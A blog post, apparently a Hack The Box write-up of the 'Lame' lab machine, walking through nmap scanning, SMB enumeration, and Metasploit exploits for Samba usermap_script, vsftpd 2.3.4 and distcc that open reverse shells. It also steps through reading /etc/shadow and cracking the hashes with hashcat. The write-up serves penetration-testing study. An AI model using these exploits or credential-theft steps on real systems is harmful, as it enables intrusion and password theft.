--- 
layout: post 
title: Lame HTB Writeup
date: 2020-05-17 018:00:00 -0400 
categories: InfoSec 
---



# Lame

Linux machine

## nmap

```
nmap -A -T4 -p- 10.10.10.3
```

## ports

```
Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-11 23:09 EDT
 Nmap scan report for 10.10.10.3
 Host is up (0.093s latency).
 Not shown: 65530 filtered ports
 PORT     STATE SERVICE     VERSION
 21/tcp   open  ftp         3
 |_ftp-anon: Anonymous FTP login allowed (FTP code 230)
 | ftp-syst: 
 |   STAT: 
 | FTP server status:
 |      Connected to 10.10.14.17
 |      Logged in as ftp
 |      TYPE: ASCII
 |      No session bandwidth limit
 |      Session timeout in seconds is 300
 |      Control connection is plain text
 |      Data connections will be plain text
 |      vsFTPd 2.3.4 - secure, fast, stable
 |_End of status
 22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
 | ssh-hostkey: 
 |   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
 |_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
 139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
 445/tcp  open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
 3632/tcp open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
 Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
 Aggressive OS guesses: OpenWrt White Russian 0.9 (Linux 2.4.30) (92%), Linux 2.6.23 (92%), Arris TG862G/CT cable modem (92%), Control4 HC-300 home controller (92%), D-Link DAP-1522 WAP, or Xerox WorkCentre Pro 245 or 6556 printer (92%), Dell Integrated Remote Access Controller (iDRAC6) (92%), Linksys WET54GS5 WAP, Tranzeo TR-CPQ-19f WAP, or Xerox WorkCentre Pro 265 printer (92%), Linux 2.4.21 - 2.4.31 (likely embedded) (92%), Citrix XenServer 5.5 (Linux 2.6.18) (92%), Linux 2.6.27 - 2.6.28 (92%)
 No exact OS matches for host (test conditions non-ideal).
 Network Distance: 2 hops
 Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
 
 Host script results:
 |_clock-skew: mean: -3d00h52m25s, deviation: 2h49m43s, median: -3d02h52m26s
 | smb-os-discovery: 
 |   OS: Unix (Samba 3.0.20-Debian)
 |   Computer name: lame
 |   NetBIOS computer name: 
 |   Domain name: hackthebox.gr
 |   FQDN: lame.hackthebox.gr
 |_  System time: 2020-05-08T20:18:55-04:00
 | smb-security-mode: 
 |   account_used: <blank>
 |   authentication_level: user
 |   challenge_response: supported
 |_  message_signing: disabled (dangerous, but default)
 |_smb2-time: Protocol negotiation failed (SMB2)
 
 TRACEROUTE (using port 445/tcp)
 HOP RTT      ADDRESS
 1   91.69 ms 10.10.14.1
 2   91.99 ms 10.10.10.3
 
 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 158.53 seconds
```

## smb enum

```
smbclient -L \\\10.10.10.3.\\
allows for anon login try tmp
smbclient \\\10.10.10.3\\tmp
ls
Nothing worth looking at. 
version - samba 3.0.20-Debian  -from nmap scan.
```

See if there are exploits on that SMB version. 

found a module. 

## SMB Exploit

```
msf5 > use exploit/multi/samba/usermap_script
 msf5 exploit(multi/samba/usermap_script) > options
 
 Module options (exploit/multi/samba/usermap_script):
 
 Name    Current Setting  Required  Description
 ----    ---------------  --------  -----------
 RHOSTS                   yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
 RPORT   139              yes       The target port (TCP)
 
 
 Exploit target:
 
 Id  Name
 --  ----
 0   Automatic
 
 
 msf5 exploit(multi/samba/usermap_script) > set rhost 10.10.10.3
 rhost => 10.10.10.3
 msf5 exploit(multi/samba/usermap_script) > run
 
 [*] Started reverse TCP double handler on 10.10.14.17:4444 
 [*] Accepted the first client connection...
 [*] Accepted the second client connection...
 [*] Command: echo uoDexrJBt0bwYHdC;
 [*] Writing to socket A
 [*] Writing to socket B
 [*] Reading from sockets...
 [*] Reading from socket B
 [*] B: "uoDexrJBt0bwYHdC\r\n"
 [*] Matching...
 [*] A is input...
 [*] Command shell session 1 opened (10.10.14.17:4444 -> 10.10.10.3:46751) at 2020-05-11 23:14:41 -0400
 
 
```

## Shell

```
whoami
 root
 hostname
 lame
 cd root
 updatedb
 locate root.txt
 /root/root.txt
 pwd
 /root
 cat root.txt
 92caac3be140ef409e45721348a4e9df
```

## Post exploit

```
cat /etc/passwd
copy this and save it
then get shadow
cat /etc/shadow/
grab the hashes and save them. 
Run unshadow on the files you've made
use hashcat against the unshadow file
--------------------------------------

```

# Other Vulns

## check the ftp version for exploits. FTP version vsFTPd 2.3.4 has metasploit exploit.

```
msf5 > use exploit/unix/ftp/vsftpd_234_backdoor
 msf5 exploit(unix/ftp/vsftpd_234_backdoor) > show targets
 
 Exploit targets:
 
 Id  Name
 --  ----
 0   Automatic
 
 
 msf5 exploit(unix/ftp/vsftpd_234_backdoor) > options
 
 Module options (exploit/unix/ftp/vsftpd_234_backdoor):
 
 Name    Current Setting  Required  Description
 ----    ---------------  --------  -----------
 RHOSTS                   yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
 RPORT   21               yes       The target port (TCP)
 
 
 Exploit target:
 
 Id  Name
 --  ----
 0   Automatic
 
 
 msf5 exploit(unix/ftp/vsftpd_234_backdoor) > set rhosts 10.10.10.3
 rhosts => 10.10.10.3
 msf5 exploit(unix/ftp/vsftpd_234_backdoor) > run
 
 [*] 10.10.10.3:21 - Banner: 220 (vsFTPd 2.3.4)
 [*] 10.10.10.3:21 - USER: 331 Please specify the password.
 [*] Exploit completed, but no session was created.
```

## Manual exploit

found a manual exploit for vsFTPd 2.3.4 - connecting to the ftp and placing a : and ) into the USER field triggers opening port 6200  

Manual exploit reference.

[Exploit vsftpd version 2.3.4](https://mkirbypn.wordpress.com/2016/02/23/exploit-vstftpd-version-2-3-4/)

```
$telnet 10.10.10.3 21
 Trying 10.10.10.3...
 Connected to 10.10.10.3.
 Escape character is '^]'.
 220 (vsFTPd 2.3.4)
 USER WillThisWork: )
 331 Please specify the password.
 PASS lolololol
 530 Login incorrect.
 ^]
 telnet> quit
 Connection closed.
 
$nmap -A -Pn -p 6200 10.10.10.3
 Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-11 23:41 EDT
 Nmap scan report for 10.10.10.3
 Host is up.
 
 PORT     STATE    SERVICE VERSION
 6200/tcp filtered lm-x
 
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 2.72 seconds
```

## DistCC Metasploit exploit

```
msf5 > use exploit/unix/misc/distcc_exec
msf5 exploit(unix/misc/distcc_exec) > options

Module options (exploit/unix/misc/distcc_exec):

Name    Current Setting  Required  Description
----    ---------------  --------  -----------
RHOSTS                   yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
RPORT   3632             yes       The target port (TCP)

Exploit target:

Id  Name
--  ----
0   Automatic Target

msf5 exploit(unix/misc/distcc_exec) > set rhosts 10.10.10.3
rhosts => 10.10.10.3
msf5 exploit(unix/misc/distcc_exec) > show targets

Exploit targets:

Id  Name
--  ----
0   Automatic Target

msf5 exploit(unix/misc/distcc_exec) > run

[*] Started reverse TCP double handler on 10.10.14.17:4444 
[*] Accepted the first client connection...
[*] Accepted the second client connection...
[*] Command: echo m93VaQ0EKR7SGV6V;
[*] Writing to socket A
[*] Writing to socket B
[*] Reading from sockets...
[*] Reading from socket B
[*] B: "m93VaQ0EKR7SGV6V\r\n"
[*] Matching...
[*] A is input...
[*] Command shell session 1 opened (10.10.14.17:4444 -> 10.10.10.3:46789) at 2020-05-11 23:49:23 -0400

whoami
daemon
pwd
/tmp
```